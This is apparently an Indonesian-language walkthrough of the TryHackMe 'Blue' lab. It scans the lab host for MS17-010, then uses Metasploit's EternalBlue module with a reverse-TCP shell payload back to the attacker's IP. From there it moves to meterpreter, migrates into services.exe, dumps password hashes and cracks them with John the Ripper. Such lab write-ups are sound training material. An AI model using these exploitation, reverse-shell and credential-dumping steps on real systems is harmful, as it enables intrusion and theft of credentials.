# CTF Blue
- TryHackMe Room: https://tryhackme.com/room/blue
- IP Machine: 10.10.88.234

## Nmap Report
- Baris perintah: `nmap -sV --script vuln <IP Machine>`

```sh
┌──(root㉿kali)-[/home/kali]
└─# nmap -sV --script vuln 10.10.88.234 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-29 02:38 EDT
Nmap scan report for 10.10.88.234
Host is up (0.20s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.80 seconds
```
- Dari hasil scanning, diketahui bahwa service SMB memiliki jenis kerentanan **ms17-010**


## Metasploit
- Buka `msfconsole` di terminal

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%201.JPG)

- Cari modul untuk exploit jenis kerentanan ms17–010 dengan perintah `search ms17–010`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%202.JPG)

- Disini kita menggunakan modul **exploit/windows/smb/ms17_010_eternalblue** yang ada di list nomor 0. Jadi cukup gunakan perintah `use 0`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%203.JPG)

- Ketik `show options` untuk melihat daftar parameter yang perlu diisi pada modul tersebut

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%204.JPG)

- Gunakan perintah `set <Nama parameter> <Value>` untuk mengisi parameter. Isi parameter RHOSTS dengan IP Machnine dan isi parameter LHOST dengan IP tun0 pada komputer yang anda gunakan. Kemudian setting payload `set payload windows/x64/shell/reverse_tcp` sesuai petunjuk soal

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%205.JPG)

- Ketik `exploit` untuk memulai proses exploitasi

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%206.JPG)

- Proses exploitasi berhasil dan kita masuk sebagai **nt authority\system**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%207.JPG)

- Tekan **Ctrl+Z** lalu ketik "y" untuk mengubah session 1 ke background

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%208.JPG)

- Cari modul untuk mengkonversi shell sistem ke shell meterpreter di metasploit. Kita bisa gunakan perintah `search shell_to_meterpreter`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%209.JPG)

- Karena hanya ada 1 modul, langsung kita gunakan modul tersebut dengan perintah `use 0`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2010.JPG)

- Ketik `show options` untuk melihat daftar parameter yang perlu diisi pada modul tersebut

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2011.JPG)

- Gunakan perintah `set <Nama parameter> <Value>` untuk mengisi parameter. Isi parameter LHOST dengan IP tun0 pada komputer yang anda gunakan dan parameter SESSION dengan 1

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2012.JPG)

- Ketik `exploit` untuk memulai proses exploitasi. Proses exploitasi berhasil dan ketikkan `sessions` untuk melihat daftar session yang berhasil terbentuk

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2013.JPG)

- Masuk ke session 2 dengan perintah `sessions -i <nomor session>`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2014.JPG)

- Ketik `ps` untuk melihat daftar proses yang berjalan di server sesuai arahan tugas. Disini ditemukan program services.exe yang berjalan di PID 672

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2015.JPG)

- Lakukan migrate dengan perintah `migrate <PID>`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2016.JPG)

- Ketik `hashdump` maka akan diperoleh daftar user beserta passwordnya yang di hash

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2017.JPG)

- Simpan hash user Jon kedalam file untuk melakukan cracking dengan perintah `echo hash > nama_file`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2018.JPG)

- Lakukan cracking dengan tool john the ripper `john --wordlist=/usr/share/wordlists/rockyou.txt nama_file`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2019.JPG)